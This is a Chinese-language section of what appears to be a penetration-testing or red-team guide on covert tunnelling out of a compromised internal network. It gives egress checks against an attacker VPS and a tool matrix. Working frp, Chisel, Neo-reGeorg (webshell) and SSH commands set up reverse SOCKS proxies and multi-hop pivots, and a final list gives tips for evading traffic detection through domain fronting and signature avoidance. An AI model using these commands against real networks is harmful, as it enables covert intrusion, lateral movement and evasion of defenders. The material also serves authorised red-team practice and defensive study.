## 四、隐藏通信隧道

### 4.1 连通性判断
```bash
# 分别测试各协议出网(内网边界/防火墙策略)
ping 8.8.8.8                       # ICMP
curl -x http://<vps>:8080 http://example.com   # HTTP(S)代理出网
nslookup <dnslog>.dnslog.cn <vps_ip>           # DNS出网(仅53)
nc -vz <vps> 53 ; nc -vz <vps> 443             # TCP端口出网
# 判断进网：能否被外网直接访问(映射/公网IP/云负载均衡)
```
> 出网方式直接决定隧道选型：`能直连外网→frp/EW`、`仅HTTP(S)→reGeorg/Chisel`、`仅DNS→dnscat2/iodine`、`仅ICMP→icmpsh/ptunnel`。

### 4.2 隧道工具矩阵
| 工具 | 场景 | 特征 |
|------|------|------|
| frp | 通用TCP/SOCKS代理,稳定 | 特征明显,需混淆/加壳 |
| Chisel | 单二进制,HTTP/WS封装,穿透性强 | 建议over WSS |
| Neo-reGeorg | WebShell环境(php/jsp/aspx) | 流量走HTTP隧道 |
| nps/pystinger | 多级代理/EDR环境(毒刺免杀好) | 支持内网级联 |
| EarthWorm(EW) | 老牌正向/反向/多级代理 | 静态特征多,慎用 |
| Venom | 多级代理+端口转发 | 模块化 |
| lcx | 端口转发(3389映射出网) | 明文,易被查杀 |
| SSH | -L/-R/-D 本地/远程/动态转发 | 有SSH入口首选 |
| netsh portproxy | Windows自带端口转发 | 无文件落地 |
| icmpsh/ptunnel | ICMP隧道 | 严格防火墙下保底 |
| dnscat2/iodine | DNS隧道 | 仅DNS出网 |

### 4.3 代理搭建实战
```bash
# frp SOCKS5
# frps.ini(服务端VPS)
[common]
bind_port = 7000
token = s3cr3t
# frpc.ini(内网主机)
[common]
server_addr = <vps>
server_port = 7000
token = s3cr3t
[socks5]
type = tcp
remote_port = 6000
plugin = socks5
# 本地使用
proxychains nmap -sT -Pn 10.10.10.0/24

# Chisel 反向代理(单文件,静态二进制,配合TLS混淆)
chisel server -p 8080 --reverse                # VPS
chisel client wss://<vps>:8080 R:socks         # 内网主机(WS封装过WAF)

# Neo-reGeorg(WebShell场景)
python neoreg.py generate -k password          # 生成隧道脚本上传
python neoreg.py -k password -u http://target/tunnel.jsp -l 127.0.0.1 -p 1080

# SSH动态转发(有SSH权限时最优雅)
ssh -CfNg -D 1080 user@target
```

### 4.4 内网级联代理（多跳）
```
# 场景: A(边界) → B(核心网) → C(隔离网)
# 级联方式: B上跑二级frps → 本地proxychains链到B → B上proxychains链到C
# 或 pystinger/nps 支持的内网级联: agent→proxy→二级agent
# 工具链: frp多级 / nps / pystinger / ssh ProxyJump(-J)
ssh -J userA@A,userB@B userC@C -D 1080        # SSH JumpHost级联
```

### 4.5 隧道检测规避（攻防对抗视角）
```
- 尽量使用标准协议封装: WSS(Chisel)/DNS(iodine)/ICMP(icmpsh)
- 低频率小流量: 避开流量监控的"突发隧道"特征
- 端口复用: 走已开放的80/443/53端口
- 域前置/DNS over HTTPS 规避内容检测
- 定期轮换端口与证书,避免长期固定特征
- 避免使用已知静态签名的老工具(EW/lcx/cobaltstrike默认特征)
```

